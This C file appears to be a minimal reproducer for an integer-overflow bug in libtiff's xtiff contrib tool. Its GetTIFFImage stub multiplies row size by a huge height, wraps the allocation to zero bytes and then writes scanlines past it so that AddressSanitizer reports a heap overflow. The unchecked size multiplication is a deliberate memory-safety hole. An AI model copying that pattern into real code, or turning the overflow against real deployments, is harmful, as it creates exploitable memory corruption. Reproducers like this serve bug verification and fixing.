#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

// Avoid linking against the real libtiff TIFFReadScanline by renaming it locally
#define TIFFReadScanline MyTIFFReadScanline

// Minimal stub TIFF object to carry the per-row size we want to write
typedef struct {
    unsigned int bytesPerRow;
    unsigned int imageHeight;
} TIFF;

// MCHECK as used in xtiff.c
#define MCHECK(p) do { if (!(p)) { fprintf(stderr, "MCHECK: allocation failed\n"); exit(1); } } while (0)

// Stub that simulates reading a full scanline by writing bytesPerRow bytes
static int TIFFReadScanline(TIFF *tfFile, void *buf, unsigned int row, unsigned short sample)
{
    (void)row; (void)sample; // unused in this stub
    // Write exactly tfFile->bytesPerRow bytes into the provided buffer
    memset(buf, 0x41, tfFile->bytesPerRow);
    return (int)tfFile->bytesPerRow; // positive value indicates success
}

// Vulnerable code path extracted/minimized from contrib/dbs/xtiff/xtiff.c:GetTIFFImage
// Specifically the branch where xImageDepth == tfImageDepth leading to:
//   imageMemory = malloc(tfBytesPerRow * tfImageHeight);
//   for (i = 0; i < tfImageHeight; i++, output_p += tfBytesPerRow)
//       TIFFReadScanline(tfFile, output_p, i, 0);
static void GetTIFFImage(TIFF *tfFile,
                         unsigned int tfBytesPerRow,
                         unsigned int tfImageHeight,
                         int xImageDepth,
                         int tfImageDepth)
{
    char *imageMemory = NULL;
    char *output_p = NULL;
    unsigned int i;

    if (xImageDepth == tfImageDepth) {
        // Integer overflow to undersized allocation happens here when
        // tfBytesPerRow * tfImageHeight overflows 32-bit unsigned int.
        output_p = imageMemory = (char*)malloc(tfBytesPerRow * tfImageHeight);
        MCHECK(imageMemory);

        for (i = 0; i < tfImageHeight; i++, output_p += tfBytesPerRow) {
            if (TIFFReadScanline(tfFile, output_p, i, 0) < 0)
                break;
        }

        // If ASan didn't crash already, free memory
        free(imageMemory);
    } else {
        fprintf(stderr, "Unexpected depths; this reproducer expects equality.\n");
    }
}

int main(void)
{
    // Craft parameters so that:
    // - Per-row write is modest (1 KiB) so it's quick to trigger ASan
    // - Height is huge so multiplication overflows 32-bit
    //   1024 * 0x80000000 = 0x20000000000 -> wraps to 0 in 32-bit
    //   malloc(0) returns a tiny/zero-sized allocation
    // - The loop immediately writes 1024 bytes into that tiny buffer
    TIFF fake;
    fake.bytesPerRow = 1024;              // tfBytesPerRow
    fake.imageHeight = 0x80000000u;       // tfImageHeight (very large)

    // Depths equal to take the vulnerable branch
    int xImageDepth = 8;
    int tfImageDepth = 8;

    // Call the vulnerable routine
    GetTIFFImage(&fake, fake.bytesPerRow, fake.imageHeight, xImageDepth, tfImageDepth);

    // Should not reach here without ASan reporting
    puts("Done (unexpected if ASan is enabled)");
    return 0;
}
